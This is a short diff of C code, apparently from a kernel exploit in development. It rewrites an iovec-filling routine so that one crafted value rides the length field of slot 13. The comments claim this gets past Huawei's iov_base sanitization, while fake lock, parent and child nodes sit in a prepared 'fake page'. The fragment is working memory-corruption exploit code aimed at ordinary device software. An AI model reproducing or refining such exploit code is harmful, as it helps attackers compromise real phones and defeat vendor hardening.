@@ -246,15 +246,11 @@ static void overlay_fill_word(struct iovec *iv, int n, int slot, uint64_t v) {
 
 static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
   memset(iv, 0, sizeof(*iv) * (size_t)n);
-  int w0_slot = env_int_range("PVM_W0_SLOT", 9, 0, 15);
-  for (int w = 0; w < 10; w++) {
-    int slot = (w == 0) ? w0_slot : (base_word + w);
-    if (slot < 0 || slot >= 2 * n) continue;
-    if (slot & 1)
-      iv[slot / 2].iov_len = overlay_word_value(w);
-    else
-      iv[slot / 2].iov_base = (void *)overlay_word_value(w);
-  }
+  /* v4: ONLY word7 (W->lock) is a stack value - rides iov LEN slot 13
+     (proven to survive Huawei iov_base sanitization). Parent/child/top
+     nodes all live in the fake page (set from pselect_custom_target). */
+  (void)base_word;
+  iv[13 / 2].iov_len = overlay_word_value(7);
 }
 
 static void overlay_fill_words(char *buf, size_t bytes, int base_word) {
